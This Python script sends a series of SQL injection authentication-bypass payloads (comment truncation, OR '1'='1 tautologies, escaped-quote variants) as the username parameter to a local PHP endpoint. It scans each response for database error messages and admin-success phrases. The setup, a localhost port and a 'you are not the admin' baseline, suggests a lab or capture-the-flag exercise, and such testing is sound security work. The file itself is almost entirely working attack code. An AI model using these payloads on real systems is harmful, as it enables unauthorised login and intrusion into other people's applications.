import requests
import urllib.parse
import re

# Target endpoint
target_url = "http://127.0.0.1:33148/index.php"

# Test payloads - using URL encoding to ensure proper transmission
test_payloads = {
    "admin%23": "admin%23",  # hash comment
    "admin'-- ": "admin%27--+",  # SQL comment (space becomes +)
    "admin' OR '1'='1": "admin%27+OR+%271%27%3D%271",  # boolean logic
    "admin' AND 1=1-- ": "admin%27+AND+1%3D1--+",  # boolean
    "admin\\' OR 1=1-- ": "admin%5C%27+OR+1%3D1--+",  # escaped quote
    "' OR 1=1-- ": "%27+OR+1%3D1--+",  # without admin
}

print("[*] Starting authentication bypass test sequence...")
print(f"[*] Target: {target_url}")
print("[*] Testing payload variations for SQL injection indicators\n")

results = {}

# Test each payload
for name, payload in test_payloads.items():
    print(f"\n[TEST] Payload: {name}")
    print(f"[TEST] URL encoded: {payload}")
    
    try:
        # Send GET request with payload
        response = requests.get(
            target_url,
            params={"username": urllib.parse.unquote(payload)},
            timeout=10,
            allow_redirects=True
        )
        
        # Store results for comparison
        results[name] = {
            "encoded_payload": payload,
            "status_code": response.status_code,
            "content_length": len(response.content),
            "response_body": response.text,
        }
        
        # Print detailed response information
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Content Length: {len(response.content)} bytes")
        
        # Look for indicator strings
        body_lower = response.text.lower()
        
        # Check for common SQL error messages
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "sql error", "unclosed quotation mark", "syntax error",
            "you have an error in your sql syntax", "warning: mysql"
        ]
        
        found_errors = []
        for error_phrase in sql_errors:
            if error_phrase in body_lower:
                found_errors.append(error_phrase)
        
        # Check for success/admin indicators
        success_indicators = [
            "you are the admin", "welcome admin", "admin panel",
            "logged in as admin", "administrator", "authentication successful"
        ]
        
        found_success = []
        for success_phrase in success_indicators:
            if success_phrase in body_lower:
                found_success.append(success_phrase)
        
        # Check for "you are not the admin" - the baseline message
        not_admin = "you are not the admin" in body_lower
        
        print(f"\n[*] Analysis:")
        print(f"[+] Contains 'you are not the admin': {not_admin}")
        
        if found_errors:
            print(f"[!] SQL ERROR MESSAGES DETECTED:")
            for err in found_errors:
                print(f"    - {err}")
        else:
            print(f"[-] No SQL error messages found")
        
        if found_success:
            print(f"[!] SUCCESS INDICATORS DETECTED:")
            for success in found_success:
                print(f"    - {success}")
        else:
            print(f"[-] No success indicators found")
        
        # Print response body
        print(f"\n[*] Response Body:")
        preview = response.text[:500] if len(response.text) > 500 else response.text
        print(preview)
        if len(response.text) > 500:
            print(f"... ({len(response.text) - 500} more characters)")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: Request failed: {e}")
        results[name] = {
            "encoded_payload": payload,
            "error": str(e)
        }
    
    print("\n" + "-" * 80)

# Summary of findings
print("\n[*] SUMMARY OF ALL TESTS:")
print("-" * 80)

for name, result in results.items():
    print(f"\nPayload: {name}")
    if "error" in result:
        print(f"  Status: REQUEST FAILED - {result['error']}")
    else:
        print(f"  Status Code: {result['status_code']}")
        print(f"  Content Length: {result['content_length']} bytes")
        
        body_lower = result['response_body'].lower()
        not_admin = "you are not the admin" in body_lower
        print(f"  'you are not the admin' present: {not_admin}")

print("\n[*] Test sequence completed.")
